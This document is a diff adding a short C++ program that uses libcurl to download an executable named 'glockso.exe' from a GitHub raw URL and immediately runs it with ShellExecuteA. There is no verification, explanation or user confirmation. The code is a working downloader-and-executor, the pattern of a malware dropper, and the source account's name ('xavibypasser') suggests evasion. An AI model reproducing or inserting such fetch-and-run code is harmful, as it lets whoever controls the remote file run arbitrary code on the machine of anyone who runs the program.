@@ -1,0 +1,70 @@
+#include <iostream>
+#include <fstream>
+#include <curl/curl.h>
+#include <windows.h>
+
+// Callback function for writing data to a file
+size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
+    std::ofstream *outFile = static_cast<std::ofstream*>(userp);
+    size_t totalSize = size * nmemb;
+    outFile->write(reinterpret_cast<const char*>(contents), totalSize);
+    return totalSize;
+}
+
+// Function to download the file
+bool downloadFile(const std::string& url, const std::string& outputFile) {
+    CURL *curl;
+    CURLcode res;
+    std::ofstream outFile(outputFile, std::ios::binary);
+
+    if (!outFile.is_open()) {
+        std::cerr << "Error opening output file!" << std::endl;
+        return false;
+    }
+
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    curl = curl_easy_init();
+
+    if(curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &outFile);
+
+        res = curl_easy_perform(curl);
+        if (res != CURLE_OK) {
+            std::cerr << "CURL download failed: " << curl_easy_strerror(res) << std::endl;
+            curl_easy_cleanup(curl);
+            curl_global_cleanup();
+            return false;
+        }
+
+        curl_easy_cleanup(curl);
+    }
+
+    curl_global_cleanup();
+    return true;
+}
+
+// Function to execute the downloaded executable
+void executeFile(const std::string& filePath) {
+    if (ShellExecuteA(NULL, "open", filePath.c_str(), NULL, NULL, SW_SHOW) <= (HINSTANCE)32) {
+        std::cerr << "Failed to execute the file." << std::endl;
+    }
+}
+
+int main() {
+    std::string url = "https://github.com/xavibypasser/forensics/raw/refs/heads/main/glockso.exe";
+    std::string outputFile = "glockso.exe";
+
+    // Download the file
+    if (downloadFile(url, outputFile)) {
+        std::cout << "File downloaded successfully." << std::endl;
+
+        // Execute the downloaded file
+        executeFile(outputFile);
+    } else {
+        std::cerr << "File download failed." << std::endl;
+    }
+
+    return 0;
+}
